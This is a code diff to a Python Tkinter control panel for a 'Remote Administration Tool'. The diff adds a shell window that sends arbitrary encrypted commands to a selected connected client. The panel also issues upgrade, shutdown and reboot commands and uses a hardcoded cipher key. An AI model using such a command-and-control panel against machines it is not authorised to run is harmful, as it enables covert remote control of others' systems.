@@ -31,7 +31,7 @@ cipher = AESCipher('<\x18\xadx\xbfp2\xf6\x9aH\xa3\xd3q}D\xe9\xce\\\xdf\x05XS\x7f
 class MainWindow(Tk):
     def __init__(self):
         Tk.__init__(self)
-        self.title(string = '<< Remote Administration Tool | Control Panel >>')
+        self.title(string = '<< Remote Administration Tool | Dashboard >>')
         self.resizable(0,0)
         #self.geometry('1250x600')
 
@@ -40,6 +40,7 @@ class MainWindow(Tk):
             'port' : IntVar(),
             'command' : StringVar(),
             'key' : StringVar(),
+            'shellbar' : StringVar(),
 
         }
 
@@ -92,7 +93,7 @@ class MainWindow(Tk):
         save_log = Button(features, text = 'List Available Keys', command = '', width = 20).grid(row = 3, column = 1)
 
         shutdown_button = Button(features, text = 'Refresh client list', command = '', width = 20).grid(row = 1, column = 3)
-        drop_shell = Button(features, text = 'Drop to Shell', command = '', width = 20).grid(row = 2, column = 3)
+        drop_shell = Button(features, text = 'Drop to Shell', command = self.drop_to_shell, width = 20).grid(row = 2, column = 3)
 
         update_all = Button(features, text = 'Update All Clients', command = self.update_all, width = 20).grid(row = 1, column = 4)
         update = Button(features, text = 'Update Selected Client', command = self.update_client, width = 20).grid(row = 2, column = 4)
@@ -116,6 +117,9 @@ class MainWindow(Tk):
         Label(client_frame, text = 'Client list').grid(row = 0, column = 1)
         self.options['clients'] = Listbox(client_frame, width = 120, height = 30)
         self.options['clients'].grid(row = 1, column = 1)
+        self.options['clients'].bind("<Double-Button-1>", self.drop_to_shell)
+        self.options['clients'].insert(END, '[Online] 0 Upgrades for 127.0.0.1 (2DH6NA) | User: root')
+
 
         # Log Frame
         Label(client_frame, text = 'Log').grid(row = 0, column = 2)
@@ -164,6 +168,42 @@ class MainWindow(Tk):
                             self.options['clients'].insert(END, data)
                         else:
                             self.options['log'].insert('1.0', '%s\n' % data, 'yellow')
+                            try:
+                                self.options['shellframe'].insert('1.0', '%s\n' % data, 'yellow')
+                            except Exception:
+                                pass
+
+    def drop_to_shell(self, event):
+        try:
+            selection = self.options['clients'].get(self.options['clients'].curselection())
+        except Exception:
+            self.options['log'].insert('1.0', '[%s %s] [ERROR] Please, select a client' % (time.strftime('%x'), time.strftime('%X')), 'red')
+
+        selection = self.options['clients'].get(self.options['clients'].curselection())
+        self.options['key'] = selection.split('(')[1].split(')')[0]
+
+        ip = self.options['clients'].get(self.options['clients'].curselection())
+        ip = selection.split(' ')[4]
+
+        self.shell = Toplevel()
+        self.shell.title(string = 'Shell access for %s [%s]' % (ip, self.options['key']))
+        self.shell.resizable(0,0)
+
+        # Command output frame
+        self.options['shellframe'] = Text(self.shell, background = 'black', foreground = 'white', height = 32, width = 80)
+        self.options['shellframe'].grid(row = 0, column = 1)
+
+        # Command input entry
+        self.options['shellbar'] = Entry(self.shell, textvariable = self.options['shellbar'], width = 70)
+        self.options['shellbar'].grid(row = 2, column = 1)
+        self.options['shellbar'].bind('<Return>', self.send_command_client)
+        self.options['shellbar'].focus()
+
+
+    def send_command_client(self, event):
+        self.options['shellframe'].insert('1.0', self.options['shellbar'].get() + '\n')
+        s.send(cipher.encrypt('YOUDO$' + self.options['key'] + '$' + self.options['shellbar'].get()))
+        self.options['shellbar'].delete(0, END) # Clear shellbar
 
     def send_command(self):
         s.send(cipher.encrypt('COMMAND$' + self.options['command'].get()))
@@ -172,8 +212,7 @@ class MainWindow(Tk):
 
     def update_client(self):
         selection = self.options['clients'].get(self.options['clients'].curselection())
-        selection = selection.split('(')[1]
-        selection = selection.split(')')[0] # Grab key
+        selection = selection.split('(')[1].split(')')[0] # Grab key
         s.send(cipher.encrypt('UPGRADE$' + selection)) # Send update command
         self.options['log'].insert('1.0', '[%s %s] Updated %s' % (time.strftime('%x'), time.strftime('%X'), selection), 'yellow')
 
@@ -186,8 +225,7 @@ class MainWindow(Tk):
 
     def shutdown_client(self):
         selection = self.options['clients'].get(self.options['clients'].curselection())
-        selection = selection.split('(')[1]
-        selection = selection.split(')')[0] # Grab key
+        selection = selection.split('(')[1].split(')')[0] # Grab key
         s.send(cipher.encrypt('SHUTDOWN$' + selection)) # Send poweroff command
         self.options['log'].insert('1.0', '[%s %s] Updated %s' % (time.strftime('%x'), time.strftime('%X'), selection), 'yellow')
 
@@ -197,8 +235,7 @@ class MainWindow(Tk):
 
     def reboot_client(self):
         selection = self.options['clients'].get(self.options['clients'].curselection())
-        selection = selection.split('(')[1]
-        selection = selection.split(')')[0] # Grab key
+        selection = selection.split('(')[1].split(')')[0] # Grab key
         s.send(cipher.encrypt('REBOOT$' + selection)) # Send reboot command
         self.options['log'].insert('1.0', '[%s %s] Rebooted %s' % (time.strftime('%x'), time.strftime('%X'), selection), 'yellow')
 
@@ -215,7 +252,7 @@ class MainWindow(Tk):
 
     def date_time(self):
         while True:
-            self.title(string = '<< Remote Administration Tool | Control Panel  | %s %s >>' % (time.strftime('%x'), time.strftime('%X')))
+            self.title(string = '<< Remote Administration Tool | Dashboard | %s %s >>' % (time.strftime('%x'), time.strftime('%X')))
             time.sleep(1)
 
 # Generate Key
